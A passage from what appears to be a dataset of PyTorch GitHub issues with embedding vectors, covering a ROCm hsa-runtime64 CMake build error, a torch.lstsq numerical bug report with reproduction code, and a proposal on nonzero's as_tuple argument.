 -0.10349064 -0.03297748 -0.05947806  0.12681323 -0.20153128  0.29634786
 -0.09450692 -0.16951793  0.13333632  0.11637761 -0.06142086 -0.08871153
  0.20568696 -0.37654743 -0.10895659  0.07893685  0.041306   -0.44368136
  0.19142216 -0.25780115 -0.08126596 -0.10128909 -0.00944546 -0.17180406
  0.05033937  0.09317075  0.39122653  0.29081386 -0.15134475  0.06893291
 -0.10102288 -0.07617482  0.12175526  0.04314917 -0.59152865  0.05979724
 -0.04580108 -0.09545122  0.13052988 -0.06233382  0.00650722 -0.24727231
  0.11590149 -0.15368071  0.24598971  0.0077876   0.16848943  0.06189377
  0.2196293   0.0105286  -0.1009376   0.5625527  -0.07241604  0.32637846
  0.19575079 -0.41564512 -0.22094503 -0.15354764 -0.1156285  -0.3781817
 -0.16087472  0.4207661  -0.07075647 -0.1152378   0.13069163  0.39159635
  0.32920212 -0.18064067 -0.03570078  0.0768237   0.01035979  0.08907944
  0.25621563 -0.06408349 -0.3414111  -0.10104721  0.17425938  0.02700183
  0.05607172  0.16844654  0.16955638  0.0936628   0.48517928  0.08677929
  0.13106245  0.18534333 -0.04408071 -0.00522292 -0.15067665  0.28631133
  0.17914915  0.09115041  0.34806475  0.4485001  -0.20939597  0.02788417
 -0.05053728 -0.11979769 -0.17162046 -0.03398937 -0.08789656 -0.24642853
  0.08972761 -0.00796867 -0.62686455  0.22990748  0.07097413 -0.24697931
  0.28844756 -0.19778125 -0.22819524  0.25164202  0.00896081  0.06674244
  0.18407938  0.08904715  0.35843804 -0.18777594  0.12786932  0.26878142
 -0.02786786  0.15133335  0.26577067 -0.03766924 -0.2080473  -0.03733195
 -0.22772242  0.02140785 -0.02061513 -0.33364987 -0.20567891 -0.14597481
  0.18800154 -0.2384201  -0.26472378 -0.22238049 -0.2899767   0.32306534
  0.2127248   0.3487168   0.33241355  0.24573855  0.13124412  0.19381851
  0.5704236  -0.08215751 -0.14243434 -0.01379243 -0.43681043 -0.15116154
  0.06727818 -0.1367105  -0.00913039 -0.03640189  0.3084861  -0.05910597
 -0.05945358 -0.14047956  0.01806838  0.10597699  0.11106822 -0.13664085
  0.03174715  0.09521978 -0.19332117 -0.22986804 -0.16964033 -0.07237747
 -0.2775975  -0.25621355  0.00933204 -0.40762454  0.00789257 -0.00381428
 -0.20199116 -0.08183581  0.0172493   0.41901147  0.15068454 -0.01156866
  0.07497977 -0.31188083  0.01999417  0.24018857 -0.20620474  0.01062127
  0.18158317  0.08835002  0.03631487 -0.34745583  0.3660984  -0.00919684
  0.14087245  0.35589898 -0.1632853  -0.02180291  0.1266596   0.03218659
 -0.3382097  -0.3688271   0.30887538 -0.01065925  0.12857726  0.18201604
 -0.5241725   0.0233847  -0.23286316  0.1465189  -0.02781369 -0.09173466
 -0.21443379 -0.04183897  0.43651095  0.00205362  0.18978274  0.19310164
  0.18176542 -0.09272563  0.58853996  0.23806304 -0.0288205   0.25369024
  0.5275082   0.13549156 -0.20119958  0.23369479 -0.28041     0.07570048
  0.4703685  -0.6489995   0.45418477  0.36910558  0.27272797 -0.11407304
  0.2009806  -0.01804901 -0.11232986 -0.28827596  0.08838815  0.38221925
  0.08950524  0.24461403  0.28371963 -0.20803206 -0.21578375 -0.3455447
 -0.13580203 -0.266995   -0.12371714  0.10636136  0.3987617   0.00271882
 -0.511498    0.14078748  0.28160602 -0.23813926  0.1547792  -0.07251915
 -0.28084892  0.05446388  0.3075137  -0.301149   -0.2975033   0.10677247
  0.08921589  0.05253401  0.42601496 -0.43769723  0.6156776   0.10182337
 -0.15982707  0.27833202 -0.02874352  0.307813   -0.17020303  0.22415169
  0.21149316  0.2004003   0.19606014 -0.09909334 -0.283544    0.05530275
  0.08240288 -0.13590321 -0.1694889   0.3481707  -0.18892948  0.05934073
  0.0971304  -0.02434245  0.20158312 -0.05456668  0.09611102 -0.05310585
 -0.47265804  0.57034826 -0.06109294 -0.21225947 -0.2897278   0.02179833
 -0.01650627 -0.03781088 -0.19583236 -0.03758131  0.39521253  0.06775562
 -0.00212734 -0.29518926 -0.03475131  0.03845701 -0.21436311  0.1278066
  0.1210516   0.38874513 -0.16916451  0.24048778  0.4157582   0.04738317
 -0.329473   -0.03304901 -0.23114644 -0.18223341 -0.05054051  0.1865659
 -0.16094612 -0.25822806 -0.14628598  0.26753682 -0.2147963   0.17488177
  0.02601704  0.00680716  0.5154996  -0.3697452  -0.14245284  0.05310328
 -0.07521311 -0.3050169  -0.21265954  0.37039554  0.207209   -0.14567095]"
Pytorch+rocm 3.7.0: cmake cannot find hsa-runtime64 module: build module: rocm triaged,"## ðŸ› Bug

Hi,

I'm trying to build Pytorch for rocm from sources following [this page](https://github.com/aieater/rocm_pytorch_informations) and also other sources; however it ends with an error:

```
***** Library versions from cmake find_package *****

CMake Error at /usr/share/cmake-3.16/Modules/CMakeFindDependencyMacro.cmake:47 (find_package):
  By not providing ""Findhsa-runtime64.cmake"" in CMAKE_MODULE_PATH this
  project has asked CMake to find a package configuration file provided by
  ""hsa-runtime64"", but CMake did not find one.

  Could not find a package configuration file provided by ""hsa-runtime64""
  with any of the following names:

    hsa-runtime64Config.cmake
    hsa-runtime64-config.cmake

  Add the installation prefix of ""hsa-runtime64"" to CMAKE_PREFIX_PATH or set
  ""hsa-runtime64_DIR"" to a directory containing one of the above files.  If
  ""hsa-runtime64"" provides a separate development package or SDK, be sure it
  has been installed.
Call Stack (most recent call first):
  /opt/rocm/hip/lib/cmake/hip/hip-config.cmake:124 (find_dependency)
  cmake/public/LoadHIP.cmake:131 (find_package)
  cmake/public/LoadHIP.cmake:170 (find_package_and_print_version)
  cmake/Dependencies.cmake:1154 (include)
  CMakeLists.txt:486 (include)
```

The file that cmake is looking for is under /opt/rocm-3.7.0/lib/cmake/hsa-runtime64/ .
I also tried setting the variable  however setting the environmental variable to CMAKE_MODULE_PATH=/opt/rocm-3.7.0/lib/cmake/hsa-runtime64 , but still no luck.

Any hint?

## Environment

PyTorch version: N/A
Is debug build: N/A
CUDA used to build PyTorch: N/A

OS: Pop!_OS 20.04 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
Clang version: 10.0.0-4ubuntu1 
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: N/A
CUDA runtime version: Could not collect
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.19.1
[conda] Could not collect


cc @malfet @seemethere @walterddr @jeffdaily @sunway513",True,"[-9.00117755e-02 -4.19181824e-01 -3.93996388e-01 -5.67410812e-02
  1.69454232e-01 -1.48957521e-01 -2.53730208e-01 -2.62115374e-02
 -2.97822416e-01 -8.98826867e-02  1.75981358e-01 -5.73998451e-01
 -3.52133885e-02 -5.13908677e-02  8.43663737e-02  1.75604105e-01
 -1.54919043e-01 -1.97898775e-01  2.25354031e-01 -1.20242536e-02
 -1.91172101e-02  1.38261393e-01 -1.74688220e-01  1.46648377e-01
 -1.62225246e-01  2.81442255e-01 -2.07426339e-01 -3.47356796e-01
  8.70498270e-02  1.39245018e-01  5.22230029e-01  1.45463664e-02
  5.18412814e-02  1.68770149e-01  4.00881082e-01 -3.04626338e-02
 -3.19481283e-01 -1.76292449e-01 -8.08272809e-02 -1.31365448e-01
  2.68940292e-02  1.27531245e-01  1.03663415e-01  1.20187327e-01
 -4.76735353e-01  1.51710249e-02  7.50708580e-02  1.60688370e-01
 -2.29340613e-01 -1.20717876e-01 -4.54447269e-02 -9.07845795e-02
 -1.62946582e-01 -3.45952600e-01 -1.90874860e-02  2.69976854e-01
 -1.71995923e-01  4.31479871e-01  1.81117922e-01  3.46696258e-01
  1.56472564e-01  1.85485184e-02  5.31008914e-02  2.66095996e-03
  2.00032115e-01  3.45025837e-01  3.87118571e-02 -3.75130355e-01
  3.36451471e-01 -3.69597942e-01 -1.81591734e-01 -2.08278477e-01
 -4.84577641e-02 -4.01008844e-01  8.46672282e-02  3.89537334e-01
 -6.61796704e-02  1.77166060e-01 -4.77817357e-02 -2.87937552e-01
 -1.04222752e-01  1.88625872e-01  7.88829625e-02 -2.93331649e-02
  1.33851543e-01 -2.45647579e-01  1.15816027e-01 -8.97604153e-02
  2.95824319e-01  2.78639887e-02  4.46802080e-01  2.18976453e-01
  1.40354350e-01  3.83506328e-01 -4.69828397e-02  2.39640743e-01
 -2.86414661e-02  2.78455377e-01 -9.61062759e-02 -1.56308070e-01
 -1.72252566e-01 -1.19513823e-02 -2.38091946e-02  3.64784777e-01
 -4.77950990e-01 -3.14080089e-01  9.26126614e-02  1.77943110e-01
  5.16098440e-02  3.95274796e-02  1.97320618e-02  2.94444524e-03
  1.68378651e-02 -1.72843307e-01  2.38058537e-01  1.85947448e-01
 -1.69995204e-01 -1.73827797e-01 -2.34991103e-01  3.38648945e-01
 -1.91493526e-01 -3.45856249e-01 -5.53976223e-02  2.58910824e-02
  9.22403634e-02  5.05692735e-02 -4.28783000e-01 -7.05016404e-02
  2.37600476e-01  2.44142294e-01  3.34009491e-02  1.95320770e-01
  1.99083015e-02 -1.36103228e-01  1.56174049e-01  1.14162691e-01
  6.33540154e-02  1.32091045e-02  2.79066026e-01  1.00338727e-01
 -4.32104409e-01  1.60345092e-01  2.66530626e-02 -3.48013699e-01
 -5.02226204e-02 -1.93701461e-02 -8.33294690e-02  1.33464545e-01
 -6.80987835e-02 -1.01285897e-01 -9.45446342e-02  1.66161265e-03
 -2.13433325e-01  9.79781091e-01  2.86216229e-01  5.13444319e-02
  3.64433765e-01 -1.18573885e-02  1.19860440e-01 -2.86069244e-01
 -1.93704039e-01  2.26890862e-01 -7.27163479e-02  9.67647806e-02
 -2.65582204e-01 -9.90792513e-02 -4.31040049e-01  2.73501649e-02
  8.91898796e-02  4.80384529e-02  1.35591507e-01  1.83045655e-01
  2.00306147e-01 -2.54762053e-01  1.65461898e-01 -1.30911702e-02
  3.47656965e-01 -1.45065457e-01 -1.47023518e-02  2.11452127e-01
  5.48379645e-02  2.55053550e-01  5.03148496e-01 -1.23956680e-01
 -2.05619335e-01  8.01131204e-02 -3.05831153e-03 -2.05384307e-02
 -1.57037646e-01 -4.46446054e-02 -1.70611143e-01  1.28613085e-01
  6.01379350e-02  9.15674958e-04 -2.20446452e-01 -9.57234800e-02
  2.52850801e-01  1.21294551e-01  1.78122133e-01  6.05496317e-02
  1.69839203e-01  2.35833347e-01  1.03486672e-01 -4.78184968e-03
  2.04149246e-01  2.48891488e-03 -1.40800908e-01 -1.28982112e-01
 -5.70355296e-01  1.70870215e-01 -1.02195263e-01 -3.46650183e-01
 -1.09664142e-01  3.65712345e-02 -2.13104963e-01  4.22647297e-01
  3.10130835e-01 -1.59274787e-01 -2.97020912e-01  6.45750668e-03
  1.08403511e-01  3.06087527e-02 -2.27581754e-01 -1.53244853e-01
  1.43980905e-01 -9.11546201e-02 -2.40094990e-01 -1.50976360e-01
 -6.66047558e-02  2.09754333e-02 -3.63510609e-01 -4.52206880e-02
  2.91461289e-01 -2.13973939e-01  1.88353330e-01 -3.04044597e-03
  1.35208905e-01 -1.78766161e-01 -1.41619984e-02  6.50382340e-02
 -7.22113922e-02 -2.99232930e-01 -9.70892459e-02 -1.30458623e-01
  2.26446092e-01  3.85642573e-02 -3.31966400e-01 -8.76940861e-02
 -1.51960969e-01  1.42786175e-01  1.74605865e-02 -4.58198264e-02
  4.01474416e-01  4.59181100e-01  3.21670741e-01  2.95920402e-01
  8.89429227e-02  1.08591422e-01 -1.05400212e-01 -2.47522309e-01
  6.61933571e-02  4.08624113e-01 -2.96065599e-01  5.03078461e-01
  6.05149493e-02  8.37433338e-03 -4.37244415e-01 -2.44252026e-01
 -1.34557635e-01  1.73896909e-01  5.29889822e-01 -4.08715725e-01
  3.49648893e-01  3.15546468e-02  3.24916273e-01 -6.29815236e-02
  3.04179639e-01 -2.04971731e-01 -1.95057005e-01  1.44304901e-01
  4.06695828e-02  7.91170895e-02 -5.78448772e-02 -2.07800478e-01
  1.40497610e-01  9.02641416e-02 -1.56166136e-01 -4.75315750e-01
 -5.42389870e-01  2.16818243e-01 -5.15482426e-02  2.12148167e-02
  2.01894701e-01  2.67910898e-01 -2.27245688e-01 -7.19251260e-02
  4.54823151e-02  3.58445883e-01  4.12545316e-02  2.60045715e-02
 -8.04846361e-02  6.16937727e-02  3.17562342e-01 -3.10983896e-01
 -1.46031410e-01  2.54923344e-01  8.15840513e-02 -2.13555783e-01
  7.63374746e-01 -4.28880692e-01 -3.98500413e-02  1.78009585e-01
 -9.25703049e-02  4.53826100e-01 -1.44067556e-01  8.82632360e-02
 -7.50600398e-02  4.20336545e-01  2.71500945e-01  1.98087618e-02
  1.83143929e-01 -9.86063480e-02 -3.42748702e-01 -6.70198724e-03
  3.21700871e-01  2.70614684e-01 -3.61679316e-01 -3.61739755e-01
 -7.65758157e-02 -3.74992974e-02  2.00775526e-02 -6.34576604e-02
 -9.15746540e-02  3.05453598e-01 -3.07544351e-01 -8.82952660e-03
 -5.83493523e-02  1.55376554e-01 -3.47410105e-02 -6.83301508e-01
 -2.04419643e-01 -1.90233529e-01  3.56261492e-01 -6.14367664e-01
 -2.22651392e-01  6.37481660e-02  2.00906187e-01  2.57240027e-01
 -4.77771819e-01  3.99072707e-01 -4.52230573e-02  1.78404585e-01
 -4.92974445e-02 -3.99489999e-01 -1.93876158e-02  8.21823180e-02
  1.08126752e-01 -6.95385560e-02  1.35380164e-01  3.27740669e-01
 -2.32155353e-01  1.26986310e-01 -3.11385632e-01 -2.07184970e-01
  1.04402840e-01 -1.74285263e-01 -4.40266728e-01 -4.61016819e-02
  1.81150690e-01  3.19021285e-01 -3.13999027e-01  2.14826792e-01
 -3.25609148e-01 -9.76917446e-02  2.17537165e-01  2.57416666e-01
  3.36622298e-01  1.28493980e-01  8.97597224e-02 -1.30963266e-01
 -3.21315601e-02 -1.80063307e-01  5.87149104e-03 -4.05094624e-01]"
Can't solve torch.lstsq() with specific values high priority triaged module: numpy module: linear algebra,"## ðŸ› Bug

When using `torch.lstsq` to solve with specific values, `torch.lstsq` produces wrong result (on cuda) or raises error (on cpu) while `scipy.linalg.lstsq` not.

## To Reproduce

Steps to reproduce the behavior:

1. Use the dumped `.npy` file: `a.npy`, `b.npy` to perform `torch.lstsq`
2. Meanwhile, `lstsq` can also be solved in `scipy.linalg.lstsq`
3. With the given `numpy array`, `torch.lstsq` raises error on `cpu`, or gives wrong result on `cuda`, while `scipy.linalg.lstsq` not.

Code samples and error messages:

Download files:
* `a.npy`: https://github.com/xiaosu-zhu/archives/releases/download/torch.lstsq/a.npy
* `b.npy`: https://github.com/xiaosu-zhu/archives/releases/download/torch.lstsq/b.npy

```python
import numpy as np
import scipy.linalg
import torch

# sparse 0-1 matrix with shape [100000, 1024]
# each row contains exactly 4 ones and other zeros
a = np.load(""a.npy"").astype(np.float32)
# int matrix with shape [100000, 128]
b = np.load(""b.npy"").astype(np.float32)

x, _, _, _ = scipy.linalg.lstsq(a, b)

# 67480.16036171981
print(((a @ x - b) ** 2).sum(-1).mean())

b = torch.from_numpy(b).cuda()
a = torch.from_numpy(a).cuda()
x, _ = torch.lstsq(b, a)

# 7.4439e+15
print(((a @ x[:a.shape[-1]] - b) ** 2).sum(-1).mean())

# raise RuntimeError: Lapack Error in gels : 
# The 259-th diagonal element of the triangular factor of A is zero 
# at /opt/conda/conda-bld/pytorch_1595629395347/work/aten/src/TH/generic/THTensorLapack.cpp:177
x, _ = torch.lstsq(b.cpu(), a.cpu())
```

Raise `RuntimeError: Lapack Error in gels : The 259-th diagonal element of the triangular factor of A is zero at /opt/conda/conda-bld/pytorch_1595629395347/work/aten/src/TH/generic/THTensorLapack.cpp:177` when using `torch.FloatTensor`.
Or an irregular result when using `torch.cuda.FloatTensor`.

## Expected behavior

Produce the same result with `scipy.linalg.lstsq`.


## Environment

```console
PyTorch version: 1.6.0
Is debug build: False
CUDA used to build PyTorch: 10.2

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
Clang version: Could not collect
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: 
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti
GPU 2: GeForce GTX 1080 Ti
GPU 3: GeForce GTX 1080 Ti
GPU 4: GeForce GTX 1080 Ti
GPU 5: GeForce GTX 1080 Ti
GPU 6: GeForce GTX 1080 Ti
GPU 7: GeForce GTX 1080 Ti

Nvidia driver version: 450.51.05
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.6.0
[pip3] torchvision==0.7.0
[conda] blas                      1.0                         mkl    defaults
[conda] cudatoolkit               10.2.89              hfd86e86_1    defaults
[conda] mkl                       2020.1                      217    defaults
[conda] mkl-service               2.3.0            py38he904b0f_0    defaults
[conda] mkl_fft                   1.1.0            py38h23d657b_0    defaults
[conda] mkl_random                1.1.1            py38h0573a6f_0    defaults
[conda] numpy                     1.19.1           py38hbc911f0_0    defaults
[conda] numpy-base                1.19.1           py38hfa32c7d_0    defaults
[conda] pytorch                   1.6.0           py3.8_cuda10.2.89_cudnn7.6.5_0    pytorch
[conda] torchvision               0.7.0                py38_cu102    pytorch
```


cc @ezyang @gchanan @zou3519 @bdhirsh @vishwakftw @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @rgommers @vincentqb",True,"[-2.23247722e-01  4.05002385e-02 -4.09628153e-02 -1.12909600e-01
 -1.93910331e-01 -7.54335374e-02 -1.44440100e-01  1.95955247e-01
 -3.42225075e-01  1.16498709e-01 -2.67799139e-01  2.83800304e-01
  1.39832228e-01  4.44659293e-02  1.29877225e-01  1.44985959e-01
 -4.26793456e-01 -3.18658441e-01 -2.69523680e-01  6.78930506e-02
  9.53868777e-02 -8.21563005e-02 -1.03270106e-01 -1.55101582e-01
 -7.56545067e-02  7.49161392e-02 -2.05236226e-01 -1.46648347e-01
  2.12514788e-01 -4.08634432e-02 -1.96830183e-01 -7.65437027e-03
 -4.59026158e-01  1.78928524e-01  1.59339219e-01  6.79465830e-02
 -3.06993455e-01 -8.43741745e-02 -2.08926648e-01  2.27020234e-01
  2.65968084e-01  1.95286293e-02 -1.49554968e-01 -1.02768153e-01
 -1.62169188e-01 -3.07148159e-01 -1.23167276e-01  8.99928063e-02
 -2.67137408e-01 -4.87499312e-02 -1.58840135e-01  3.55926812e-01
  7.11449534e-02  5.65455183e-02  7.89399445e-02 -2.75063574e-01
 -3.84488344e-01  2.25648731e-01  1.83088750e-01 -4.18312818e-01
  1.57431185e-01  1.00524046e-01 -2.60175645e-01 -2.60139287e-01
  2.57921159e-01 -2.08669916e-01  4.27506045e-02  3.47168922e-01
  5.81327736e-01  1.92674190e-01  9.63643193e-02 -3.99591774e-03
 -4.45065945e-02 -1.08551100e-01 -1.14180841e-01  6.99851587e-02
 -3.46016020e-01  2.08986133e-01 -2.73824334e-01 -3.43654394e-01
 -1.50714651e-01 -1.52065217e-01 -1.49086803e-01  1.24968298e-01
  1.13269873e-03  2.99390666e-02  1.53843164e-01 -1.35273054e-01
  4.56291139e-01  2.17747867e-01  6.58421889e-02 -2.57105112e-01
  2.93750092e-02  3.67202520e-01 -2.36395121e-01  1.89160496e-01
  3.25605333e-01 -2.51755655e-01 -1.87625527e-01 -1.58211306e-01
  2.43708547e-02 -6.16048098e-01 -2.48620093e-01  5.15524209e-01
  1.89673394e-01 -1.73817679e-01  6.22452311e-02  4.03122932e-01
  1.52982414e-01 -3.34208190e-01  3.63663018e-01  2.48187006e-01
  7.02636540e-02 -3.21275234e-01 -2.45264340e-02 -8.09049457e-02
 -8.48926604e-02 -1.28400356e-01 -3.30987632e-01 -1.73541978e-01
  4.73549187e-01  3.76155257e-01 -6.80608600e-02  3.60533297e-01
  5.53240120e-01  3.52508686e-02 -1.72083244e-01 -1.55000836e-02
 -4.50938717e-02  2.95281887e-01  1.30113393e-01  1.47983804e-03
 -1.92513436e-01 -3.30034457e-02  3.31226707e-01  4.97619361e-01
 -2.05754042e-01  2.42747143e-01 -1.67865157e-01  7.48014301e-02
  1.88411921e-02 -2.92481244e-01 -6.05549887e-02 -2.08529592e-01
  3.38602155e-01  9.57950354e-02 -3.84990185e-01  8.23164955e-02
  1.41992524e-01  2.61978246e-04 -9.07720029e-02 -3.22079770e-02
 -3.90078485e-01 -3.48248938e-03  1.06641628e-01 -5.48899919e-02
  7.71160498e-02  1.73298344e-01  6.25444651e-01 -1.74394652e-01
  2.20104858e-01  2.87480682e-01  2.07764089e-01  6.79065436e-02
  1.72837153e-02  7.36055896e-02 -8.95731971e-02  8.93751085e-02
 -5.93133688e-01  5.79474829e-02  8.79254043e-02 -1.00667767e-01
 -1.88225452e-02 -9.83962491e-02  1.35281086e-01 -4.34741639e-02
 -8.80618766e-02 -5.10318398e-01  7.20641688e-02  4.05020803e-01
  3.91608179e-01  7.25055754e-01  3.97764802e-01  3.18721354e-01
  1.42059773e-01 -1.19427584e-01  3.52619529e-01  6.38817102e-02
  4.49909568e-02 -3.28970343e-01 -5.37188947e-01 -3.84070873e-01
  1.40787899e-01  9.76509675e-02  1.17271408e-01  8.88476372e-02
 -3.02872956e-02 -6.90912902e-02 -9.87010747e-02  9.25632194e-04
  8.18452612e-03  1.65597796e-01 -1.15182489e-01 -1.19640939e-01
  3.79638284e-01  1.97380841e-01 -3.11592877e-01 -4.25067067e-01
 -1.05642289e-01 -1.38411134e-01 -3.86862308e-01 -2.46235803e-01
  4.44293916e-02 -2.24935085e-01 -1.38282314e-01  7.65639842e-02
 -1.16730340e-01  7.16180950e-02  5.45529127e-02  1.23570450e-01
  1.98497817e-01  1.19841263e-01 -8.90557468e-02 -2.69982487e-01
 -8.49035904e-02  2.08946049e-01 -2.17302054e-01 -3.97684611e-02
  2.98130631e-01  1.42763741e-02 -1.03473097e-01 -4.49252933e-01
  8.69955719e-02  1.52855769e-01  9.83148590e-02  2.78642148e-01
 -9.07531232e-02 -1.68262087e-02 -1.57297671e-01 -6.76364377e-02
  2.44079474e-02 -1.87157616e-01  1.66703820e-01 -8.78711417e-02
 -3.42067361e-01  3.27366710e-01 -3.95166725e-01 -1.85761303e-01
 -2.29697570e-01  4.10426669e-02 -1.16126426e-02  9.87280086e-02
 -1.62322789e-01 -1.30992681e-01  4.32532430e-01 -1.49733266e-02
 -1.63297012e-01 -2.00228721e-01  1.80822164e-01  6.32962957e-03
 -1.34374619e-01  3.81676793e-01  4.94095087e-02  2.28361607e-01
  2.21399823e-03 -2.83043683e-01  5.76136149e-02  2.22519130e-01
 -8.65618438e-02  2.07434297e-01  1.18254632e-01 -4.21505690e-01
  4.86562043e-01  3.99422765e-01  2.63544858e-01 -2.72039711e-01
  2.62374818e-01  1.20502561e-02  1.02026492e-01 -3.93734753e-01
  9.66179222e-02  4.14974213e-01 -2.57627040e-01  2.65622228e-01
  5.81364751e-01  2.73761265e-02 -1.34257376e-01 -8.75424817e-02
 -2.76446402e-01 -2.76769996e-01 -2.41852283e-01  1.38092414e-03
  2.63387859e-01 -2.43667439e-01 -2.46332124e-01  1.03675410e-01
  3.09720010e-01 -5.92218451e-02  1.27448246e-01 -4.62593362e-02
 -5.38428187e-01 -8.14322978e-02  2.13778261e-02 -2.52377614e-02
 -5.43492138e-02  5.54858595e-02  1.49277747e-01  1.74298249e-02
  3.74262452e-01 -2.94061393e-01  3.81413102e-01 -5.21351025e-03
 -3.25569004e-01 -6.54192269e-02 -4.73710299e-02  1.04622662e-01
  1.93642408e-01 -8.33664909e-02 -2.95073278e-02  4.75802496e-02
 -8.17771107e-02 -3.19078237e-01 -3.35947871e-01 -1.00270130e-01
  1.08498707e-01 -2.87433118e-02 -2.44890854e-01  2.88351357e-01
 -1.92483097e-01  2.36788243e-01  3.95125486e-02  7.48950392e-02
  3.31036925e-01  9.52504426e-02  6.47042599e-03 -3.94668728e-01
 -1.47676423e-01  3.64149332e-01 -7.58047998e-02 -3.98884833e-01
 -2.38993078e-01  3.61867920e-02  7.00962320e-02  5.37994467e-02
 -6.42130449e-02 -1.15651689e-01  1.74103770e-02  1.12799905e-01
 -7.82839507e-02  1.08517028e-01  1.41166896e-01 -2.42227241e-01
  2.03250259e-01  3.19562763e-01  1.51886865e-02  3.75288934e-01
  5.30105308e-02  2.57243395e-01  6.82801902e-02  3.07847291e-01
 -4.23523150e-02  3.72308940e-01 -2.04120040e-01  1.75092351e-02
 -3.86907905e-01 -2.16979627e-02 -7.91984238e-03 -1.77567512e-01
  2.44710773e-01  2.71205068e-01 -1.23987868e-01  2.56234761e-02
 -5.83594814e-02  1.51397005e-01  3.08197349e-01 -4.27390859e-02
  1.71039224e-01 -2.26591170e-01  2.84645826e-01 -6.00232407e-02
 -1.86418235e-01  2.14168265e-01  6.61537498e-02 -1.28923044e-01]"
Current behavior of `as_tuple` argument is inconsistent in `nonzero` module: nn triaged module: numpy module: pybind better-engineering,"After `nonzero` started warning that `as_tuple` is a required argument (1.6) a few unfortunate things has happened:
1) the examples in docs started issuing a warning #43425
2) there's no way to pass `out` and `as_tuple` arguments together
```
print(torch.nonzero(a, as_tuple=False)) #ok
print(torch.nonzero(a, out=out)) #warns
print(torch.nonzero(a, as_tuple=False, out=out)) #errors out with `TypeError: nonzero() received an invalid combination of arguments - got unrecognized keyword arguments: out`
```
The rationale behind making `as_tuple` argument required is going through deprecation cycle to change the default value of `as_tuple` so that `torch.nonzero` matches `numpy.nonzero` without any additional args. However, even if implemented properly without problems noted above, this goal is misguided and forces users to modify their codes to avoid warnings for no good reason. 
Torch default behavior for `nonzero` should not match numpy. Numpy behavior can already be achieved by either using `as_tuple=True` or calling `unbind(1)` on results of `torch.nonzero()` call, that is a very light burden for someone who wants it. But to avoid it, we are making everyone who doesn't care jump through deprecation hoops. 
Making numpy behavior default is bad, because numpy returns a tuple of tensors, whereas many users want single tensor return. Going from a single tensor to a tuple is a matter of a cheap `.unbind` call, going from a tuple to a single tensor is memory copy. Default behavior should always pick single tensor. 
My proposal is to go back to making `as_tuple` optional argument and not strive to make `nonzero` match numpy behavior.

cc @albanD @mruberry @rgommers, @alband, @stas00 ",True,"[-2.42828280e-01 -1.25389099e-01 -3.69937003e-01  4.80352826e-02
  7.84938559e-02 -2.87048489e-01  3.58019173e-01  7.50926286e-02
 -4.03011620e-01 -2.54223645e-01  6.82893470e-02 -1.99972466e-03
  1.37129739e-01  1.50376529e-01  2.39225477e-01  3.70367523e-03
 -3.88600640e-02 -2.43105769e-01 -9.98229235e-02 -2.39657849e-01
 -5.73660173e-02  1.62676334e-01 -3.09480309e-01  1.73351035e-01
 -8.24376568e-02 -1.73629299e-02 -2.22393394e-01 -2.76110053e-01
  2.64622241e-01  2.01160789e-01  1.73815712e-01  2.22264454e-01
 -3.26858163e-01  1.05008464e-02  2.63571918e-01  9.79946107e-02
 -3.67805123e-01 -1.08780220e-01 -6.22884035e-02 -8.49562287e-02
 -2.24488080e-01 -7.84462988e-02 -2.64425308e-01 -3.30981165e-01
 -9.98579711e-02 -2.75391638e-01 -3.68350804e-01  2.56333441e-01
 -7.60823488e-02  5.31998053e-02 -1.11179262e-01  3.01697344e-01
 -1.82196319e-01 -4.01263207e-01  2.85147488e-01 -1.44699320e-01
 -3.44205558e-01  3.42196733e-01 -7.76839033e-02 -3.06347102e-01
 -1.97486579e-03 -2.41679661e-02 -1.75597072e-01  1.87085643e-01
  1.32980168e-01  6.93910420e-02  1.11738153e-01  8.78573954e-02
  3.98641944e-01  1.37009159e-01  2.78398037e-01  6.94748610e-02
 -1.64990783e-01 -4.00378928e-02  2.62972787e-02  1.65903062e-01
 -1.93000406e-01  1.77465752e-01 -1.63021594e-01 -7.68538937e-02
  1.02572873e-01  1.04243636e-01  1.54207036e-01 -4.57248315e-02
  1.01983264e-01 -1.25869840e-01 -6.76644035e-03 -2.25510970e-02
  1.49664909e-01  1.97114190e-03  2.04314530e-01 -2.39559442e-01
  6.03868663e-02  4.49905455e-01  2.24826008e-01  1.66242138e-01
  2.25256920e-01  2.67480105e-01 -3.72677863e-01 -6.45612776e-02
 -1.34192314e-03 -2.55758286e-01 -9.93466973e-02  1.13465711e-01
  2.55502045e-01  8.35941881e-02  3.85937154e-01 -1.74980611e-01
  4.52615052e-01 -2.15239480e-01  2.53977001e-01 -7.80857652e-02
 -9.22636092e-02 -2.60343879e-01 -9.32848528e-02  1.82584018e-01
  6.45286366e-02 -2.93976609e-02 -2.85868078e-01  3.63772810e-01
  1.39438272e-01  2.84667909e-01 -2.57470936e-01  3.36626500e-01
  1.06901690e-01  3.00015748e-01 -2.70688497e-02 -1.07788309e-01
  2.13434789e-02 -1.25888735e-04  1.78706199e-01 -9.37013924e-02
 -3.27611804e-01 -9.19102952e-02  3.39404821e-01  1.90134525e-01
  2.11651400e-02 -1.54168904e-03 -3.46085094e-02 -1.91965550e-01
 -4.10716832e-02 -3.04239005e-01 -5.68377450e-02 -2.59915113e-01
  1.29356593e-01  2.06225514e-02 -6.64735734e-02  1.77047074e-01
  9.45090055e-02 -1.17013559e-01 -1.06520005e-01  2.80996531e-01
 -4.87066716e-01  4.71107274e-01 -1.37250096e-01 -5.24110422e-02
  3.99515212e-01  7.17632771e-02  6.87818825e-02 -5.42398691e-02
  2.36259088e-01  4.65641141e-01 -2.97015272e-02 -7.01521039e-02
  5.90699762e-02  1.32158816e-01 -1.11581050e-01 -1.19265117e-01
 -5.83465934e-01  4.35995720e-02 -3.03445272e-02  1.57756403e-01
 -5.32798767e-02 -4.41090763e-01  4.71157283e-02  5.13209514e-02
 -1.93091214e-01 -1.10587791e-01  8.23178049e-03  4.73447561e-01
